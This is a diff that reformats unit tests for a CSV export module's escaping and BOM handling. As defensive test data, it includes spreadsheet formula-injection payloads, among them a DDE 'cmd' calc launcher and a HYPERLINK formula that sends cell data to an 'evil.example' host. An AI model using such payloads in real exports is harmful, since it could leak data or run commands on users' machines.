@@ -13,9 +13,7 @@ import { buildCsv, CSV_BOM, csvEscape } from "./csv";
 describe("CSV_BOM", () => {
   test("is the UTF-8 byte-order mark and stays out of buildCsv", () => {
     expect(CSV_BOM).toBe("﻿");
-    expect(Array.from(new TextEncoder().encode(CSV_BOM))).toEqual([
-      0xef, 0xbb, 0xbf,
-    ]);
+    expect(Array.from(new TextEncoder().encode(CSV_BOM))).toEqual([0xef, 0xbb, 0xbf]);
     expect(buildCsv(["Name"], [["José"]]).startsWith(CSV_BOM)).toBe(false);
   });
 });
@@ -36,9 +34,7 @@ describe("csvEscape", () => {
   });
 
   test("quotes and doubles embedded double quotes", () => {
-    expect(csvEscape('Dana "Dee" Whitfield')).toBe(
-      '"Dana ""Dee"" Whitfield"'
-    );
+    expect(csvEscape('Dana "Dee" Whitfield')).toBe('"Dana ""Dee"" Whitfield"');
   });
 
   test("quotes cells containing line breaks", () => {
@@ -47,9 +43,7 @@ describe("csvEscape", () => {
   });
 
   test("neutralizes leading = and @ (formula injection)", () => {
-    expect(csvEscape("=HYPERLINK(\"http://evil\")")).toBe(
-      "\"'=HYPERLINK(\"\"http://evil\"\")\""
-    );
+    expect(csvEscape('=HYPERLINK("http://evil")')).toBe('"\'=HYPERLINK(""http://evil"")"');
     expect(csvEscape("@SUM(A1:A9)")).toBe("'@SUM(A1:A9)");
   });
 
@@ -61,7 +55,7 @@ describe("csvEscape", () => {
     expect(csvEscape("-2+3")).toBe("'-2+3");
     expect(csvEscape("+cmd|' /C calc'!A0")).toBe("'+cmd|' /C calc'!A0");
     expect(csvEscape('+HYPERLINK("https://evil.example/?"&A2,"Click")')).toBe(
-      '"\'+HYPERLINK(""https://evil.example/?""&A2,""Click"")"'
+      '"\'+HYPERLINK(""https://evil.example/?""&A2,""Click"")"',
     );
     // The second '+' (and the letters) disqualify the number exemption.
     expect(csvEscape("+1+cmd|' /C calc'!A0")).toBe("'+1+cmd|' /C calc'!A0");
@@ -100,11 +94,9 @@ describe("buildCsv", () => {
       [
         ["Dana", "dana@example.com"],
         ["Riley, Jr.", null],
-      ]
+      ],
     );
-    expect(csv).toBe(
-      'Name,Email\r\nDana,dana@example.com\r\n"Riley, Jr.",\r\n'
-    );
+    expect(csv).toBe('Name,Email\r\nDana,dana@example.com\r\n"Riley, Jr.",\r\n');
   });
 
   test("escapes header cells too", () => {
